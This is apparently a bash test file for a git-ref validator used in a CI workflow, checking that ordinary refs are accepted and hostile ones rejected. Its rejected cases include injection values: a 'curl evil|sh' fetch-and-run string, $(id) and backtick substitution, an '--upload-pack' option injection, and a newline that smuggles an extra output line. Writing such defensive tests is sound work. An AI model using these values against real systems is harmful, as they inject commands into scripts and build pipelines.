#!/usr/bin/env bash
# check-ref.sh accepts ordinary git refs and rejects anything that could be
# interpreted as shell, an option, or extra $GITHUB_OUTPUT lines.
set -uo pipefail
cd "$(dirname "$0")/.."
. tests/lib.sh

ok()  { if scripts/check-ref.sh "$1" >/dev/null 2>&1; then pass "accepts '$1'"; else fail "should accept '$1'"; fi; }
bad() { assert_fails "rejects '$1'" scripts/check-ref.sh "$1"; }

ok main
ok v2.2.0
ok v2.3.0-beta.1
ok demo-project
ok feature/new_thing
ok 3192943b15c8b0281c43751a9c27d418e79e7f7e

bad 'x"; curl evil|sh; "'
bad '$(id)'
bad '`id`'
bad '--upload-pack=touch /tmp/pwned'
bad '-x'
bad "$(printf 'main\nrelease=true')"
bad 'a b'
bad ''

finish
